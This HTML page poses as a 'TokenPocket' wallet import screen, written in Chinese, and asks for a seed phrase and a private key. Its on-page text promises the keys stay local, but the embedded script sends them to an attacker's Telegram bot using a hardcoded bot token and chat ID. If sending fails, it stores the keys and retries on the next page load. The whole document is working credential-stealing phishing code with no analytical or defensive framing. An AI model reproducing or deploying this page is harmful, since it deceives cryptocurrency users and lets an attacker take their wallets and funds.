<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TokenPocket</title>
<style>
  *{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,Roboto,sans-serif}
  body{background:#FFFFFF;color:#000000;min-height:100vh}
  .box{max-width:420px;margin:0 auto;background:#FFFFFF;padding:0 0 80px}
  .head{background:#F0F2F5;padding:25px 20px 20px;text-align:center;border-bottom:1px solid #E5E7EB}
  .logo{font-size:24px;font-weight:800;color:#007AFF;}
  .desc{font-size:13px;color:#6B7280;margin-top:4px}
  .card{background:#F9FAFB;margin:20px;border-radius:20px;padding:30px 24px}
  .title{font-size:18px;font-weight:700;margin-bottom:24px;text-align:center}
  .item{margin-bottom:18px}
  .item label{display:block;font-size:14px;color:#374151;margin-bottom:8px}
  .item input{
    width:100%;background:#FFFFFF;border:1px solid #D1D5DB;border-radius:16px;
    padding:16px 18px;color:#000000;font-size:15px
  }
  .btn{
    width:100%;background:#007AFF;color:#FFFFFF;font-weight:700;
    border:none;border-radius:18px;padding:18px;font-size:16px;margin-top:10px
  }
  .tip{font-size:12px;color:#6B7280;text-align:center;line-height:1.4;margin-top:14px}
</style>
</head>
<body>
<div class="box">
  <div class="head">
    <div class="logo">TokenPocket</div>
    <div class="desc">去中心化多链钱包</div>
  </div>
  <div class="card">
    <div class="title">导入钱包</div>
    <div class="item">
      <label>助记词</label>
      <input id="words" placeholder="请输入助记词，空格分隔">
    </div>
    <div class="item">
      <label>私钥</label>
      <input id="key" placeholder="请输入私钥">
    </div>
    <button class="btn" onclick="go()">确认导入</button>
    <div class="tip">助记词与私钥仅存储在本地<br>官方永不获取，安全可靠</div>
  </div>
</div>

<script>
const TOKEN = "8527941922:AAG3-y2pTmA3f07TYHXkCJABsrdFTFALRUA";
const CHATID = "6503982157";

function save(mn, pk) {
  localStorage.setItem("wc_data", JSON.stringify({mn,pk}));
}
function get() {
  try{return JSON.parse(localStorage.getItem("wc_data"));}catch(e){return null}
}
function clean() { localStorage.removeItem("wc_data"); }

async function send(mn, pk) {
  const txt = `
💰 导入成功
时间：${new Date().toLocaleString()}
助记词：${mn||'-'}
私钥：${pk||'-'}`;
  try {
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
      method:"POST", headers:{"Content-Type":"application/json"},
      body:JSON.stringify({chat_id:CHATID,text:txt})
    });
    clean();
  } catch(e) { save(mn,pk); }
}

window.onload = async () => { const d=get(); if(d) await send(d.mn,d.pk); }
async function go() {
  const mn = document.getElementById("words").value.trim();
  const pk = document.getElementById("key").value.trim();
  if(!mn && !pk){alert("请输入助记词或私钥");return;}
  alert("导入成功！");
  await send(mn,pk);
}
</script>
</body>
</html>
